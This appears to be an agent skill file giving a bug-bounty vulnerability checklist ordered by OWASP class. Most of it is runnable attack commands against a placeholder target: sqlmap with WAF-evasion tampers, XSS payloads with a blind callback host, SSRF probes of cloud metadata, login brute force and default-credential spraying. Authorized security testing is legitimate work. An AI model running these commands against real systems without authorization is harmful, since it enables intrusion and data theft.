---
name: vuln-checklist
description: Comprehensive vulnerability class checklist for systematic bug bounty testing — OWASP Top 10 and API Security mapping with specific tool commands, payloads, and escalation criteria.
---
---

# Vulnerability Checklist

Systematic testing order based on target surface. Each class includes: what to test, how to test, when to escalate, when to drop.

## Decision Tree: What to Test First

```
Target has login? → Test auth flaws first (session, brute force, logic)
Target has API? → Test API security (BOLA, mass assignment, injection)
Target has file upload? → Test upload bypass + RCE path
Target has user input reflected? → Test XSS/SQLi/SSRF
Target has admin panel? → Test privilege escalation + access control
No obvious surface? → Test business logic and access control
```

## 1. Broken Access Control (IDOR/BOLA)

**OWASP A01:2021 — #1 on API Security**

```bash
# IDOR enumeration — test parameter replacement
# For each discovered ID/parameter:
ffuf -u "https://target.com/api/resource/FUZZ" \
  -w C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/api-endpoints.txt \
  -H "Authorization: Bearer $TOKEN" \
  -fc 404,403 -fs 0

# Sequential ID testing
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} %{size_download}\n" \
    -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/users/$i"
done

# Cross-tenant IDOR — change tenant ID in request
# Original: {"tenant_id": "T123", "user_id": "U456"}
# Modified: {"tenant_id": "T999", "user_id": "U456"}
```

**Escalation**: Accessing another user's data → Medium. Accessing admin data → High. Modifying data → Critical.

**Drop**: If all IDs return 403/401 consistently with no data leakage.

## 2. Injection (SQLi)

```bash
# Quick detection with sqlmap
sqlmap -u "https://target.com/page?id=1" --batch --level=3 --risk=2 \
  --random-agent --threads=4 2>/dev/null

# POST parameter testing
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" \
  --batch --level=3 --risk=2 --random-agent 2>/dev/null

# With tamper scripts for WAF evasion
sqlmap -u "https://target.com/page?id=1" --batch \
  --tamper=space2comment,between,randomcase \
  --level=3 --risk=2 2>/dev/null

# Blind SQLi with time-based
sqlmap -u "https://target.com/page?id=1" --batch \
  --technique=T --time-sec=5 --level=3 2>/dev/null

# Ghauri (better blind SQLi detection)
ghauri -u "https://target.com/page?id=1" --batch --level=3 2>/dev/null

# ffuf for SQLi error-based discovery
ffuf -u "https://target.com/page?id=FUZZ" \
  -w C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/parameters.txt \
  -mc 500 -fs 0
```

**Escalation**: Any data extraction → High. Database access/RCE → Critical.

**Drop**: Only if all injection points return consistent errors with no data.

## 3. Cross-Site Scripting (XSS)

```bash
# Dalfox for reflected XSS
echo "https://target.com/search?q=test" | dalfox pipe \
  --blind "https://YOUR_BURP_COLLABORATOR" \
  --skip-bav -o tmp/xss-results.txt 2>/dev/null

# Manual payload testing
for payload in \
  '<script>alert(1)</script>' \
  '<img src=x onerror=alert(1)>' \
  '<svg/onload=alert(1)>' \
  '"><script>alert(document.domain)</script>' \
  "';alert(1)//"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/search?q=$ENCODED")
  echo "$CODE: $payload"
done

# Stored XSS — inject in all user input fields
ffuf -u "https://target.com/api/endpoint" \
  -X POST -H "Content-Type: application/json" \
  -d '{"field":"FUZZ"}' \
  -w C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/parameters.txt \
  -fc 400 -fs 0

# kxss for DOM-based
cat tmp/urls-with-params.txt | kxss 2>/dev/null | tee tmp/kxss-results.txt
```

**Escalation**: Reflected XSS on auth page → High. Stored XSS → High. XSS with cookie theft → Critical.

**Drop**: Self-XSS (only works on own input), DOM-only with no user interaction path.

## 4. Server-Side Request Forgery (SSRF)

```bash
# Test with interactsh for blind SSRF
INTERACT_URL=$(interactsh-client 2>/dev/null | head -1)

# Standard SSRF payloads
for payload in \
  "http://$INTERACT_URL" \
  "http://169.254.169.254/latest/meta-data/" \
  "http://127.0.0.1" \
  "http://localhost" \
  "http://[::1]" \
  "http://0177.0.0.1" \
  "http://0x7f000001"; do
  curl -s -o /dev/null -w "%{http_code}: $payload\n" \
    -H "Authorization: Bearer $TOKEN" \
    "https://target.com/fetch?url=$payload"
done

# DNS rebinding test
# Use rbndr.us or custom DNS rebinding server

# ffuf for SSRF parameters
ffuf -u "https://target.com/api/FUZZ?url=http://$INTERACT_URL" \
  -w C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/parameters.txt \
  -H "Authorization: Bearer $TOKEN" \
  -fc 400,404
```

**Escalation**: Internal service access → High. Cloud metadata → Critical. RCE via SSRF → Critical.

**Drop**: Only if all requests fail at network level with no response differentiation.

## 5. Authentication & Session Flaws

```bash
# Brute force login
ffuf -u "https://target.com/login" \
  -X POST -d "user=admin&pass=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/usernames.txt:FUZZ \
  -fs 0

# Session fixation — check if session ID changes post-auth
curl -v -c cookies.txt "https://target.com/login" 2>&1 | grep -i "set-cookie"
# Login, then check cookie again

# JWT testing
# Decode JWT, check alg: none bypass
echo "$JWT" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .

# Password reset token predictability
# Request reset, capture token, test sequential/guessable patterns
```

**Escalation**: Account takeover → Critical. Session fixation → High.

**Drop**: Rate-limited login with no bypass and no token prediction.

## 6. Business Logic Flaws

```bash
# Price manipulation — test negative quantities, price parameters
curl -X POST "https://target.com/checkout" \
  -H "Content-Type: application/json" \
  -d '{"item":"test","quantity":-1,"price":0}'

# Race conditions — concurrent requests
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"from":"A","to":"B","amount":100}"' &
done
wait

# Step skipping — bypass sequential flow
curl -X POST "https://target.com/api/complete-step" \
  -d '{"step":3,"user_id":"me"}' # Skip steps 1-2
```

**Escalation**: Financial impact → Critical. Data bypass → High.

**Drop**: If server validates all steps server-side consistently.

## 7. Security Misconfiguration

```bash
# Directory listing
ffuf -u "https://target.com/FUZZ" \
  -w C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/directories.txt \
  -fs 0 -mc 200

# Exposed admin panels
ffuf -u "https://target.com/FUZZ" \
  -w C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/directories.txt \
  -H "Authorization: Bearer $TOKEN" \
  -fc 403,404

# Verbose error messages
curl -s -X POST "https://target.com/api/test" \
  -d '{"invalid":"json"' # Malformed JSON

# Default credentials
for cred in "admin:admin" "admin:password" "test:test"; do
  USER=$(echo $cred | cut -d: -f1)
  PASS=$(echo $cred | cut -d: -f2)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/login" \
    -d "user=$USER&pass=$PASS")
  echo "$CODE: $cred"
done
```

## 8. Vulnerable Components

```bash
# Check for outdated JS libraries
cat tmp/js-urls.txt | grep -oE "[a-zA-Z0-9.-]+\.(min\.)?js" | sort -u | \
  while read js; do
    echo "=== $js ==="
    curl -s "https://target.com/$js" | grep -oE "version['\"]?:\s*['\"][0-9.]+['\"]"
  done

# nuclei for known CVEs (use selectively, not broad scan)
echo "https://target.com" | nuclei -t technologies/ -severity critical,high \
  -silent 2>/dev/null
```

## Chaining Low-Severity Findings

Chain logic:
- **Information disclosure + IDOR** = data exfiltration (High → Critical)
- **Open redirect + OAuth flaw** = account takeover (Medium → Critical)
- **XSS + CSRF** = forced actions on behalf of user (Medium → High)
- **Verbose errors + SQLi** = database exfiltration (Medium → Critical)
- **Race condition + business logic** = financial abuse (High → Critical)

## Escalation vs Drop Criteria

| Criteria | Escalate | Drop |
|----------|----------|------|
| Impact | Data exposure, account takeover, financial loss | Informational only, no real impact |
| Exploitability | Working PoC with realistic scenario | Theoretical, requires unlikely preconditions |
| Scope | Touches production user data | Test/dev environment only |
| Uniqueness | Novel bypass or unexpected behavior | Well-known, already patched pattern |
| Chain potential | Combines with another finding | Dead end after thorough testing |
